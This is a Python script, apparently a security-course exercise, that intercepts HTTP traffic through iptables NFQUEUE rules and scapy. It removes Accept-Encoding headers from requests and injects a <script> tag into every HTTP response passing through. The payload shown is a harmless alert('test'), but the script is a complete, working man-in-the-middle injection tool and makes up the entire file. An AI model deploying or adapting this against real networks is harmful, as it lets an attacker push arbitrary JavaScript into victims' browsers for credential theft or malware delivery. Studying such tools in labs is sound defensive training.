#!/usr/bin/env python

#Work Locally
#sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0
#sudo iptables -I INPUT -j NFQUEUE --queue-num 0

from netfilterqueue import NetfilterQueue
import scapy.all as scapy
import re


def set_load(packet, load):
	packet[scapy.Raw].load = load
	del packet[scapy.IP].len
	del packet[scapy.IP].chksum
	del packet[scapy.TCP].chksum

	return packet

def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.Raw): #if recieved raw data
		if scapy_packet[scapy.TCP].dport == 80:#Request
			print("HTTP Request")
			modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)
			new_packet = set_load(scapy_packet, modified_load)
			packet.set_payload(str(new_packet))

		elif scapy_packet[scapy.TCP].sport == 80:
			print("HTTP Response")
			#print(scapy_packet[scapy.Raw].load)
			modified_load = scapy_packet[scapy.Raw].load.replace("</body>","<script>alert('test');</script></body>")
			new_packet = set_load(scapy_packet, modified_load)
			packet.set_payload(str(new_packet))
	packet.accept()



nfqueue = NetfilterQueue()
nfqueue.bind(0, process_packet)

try:
    nfqueue.run()
except KeyboardInterrupt:
    print('')

nfqueue.unbind()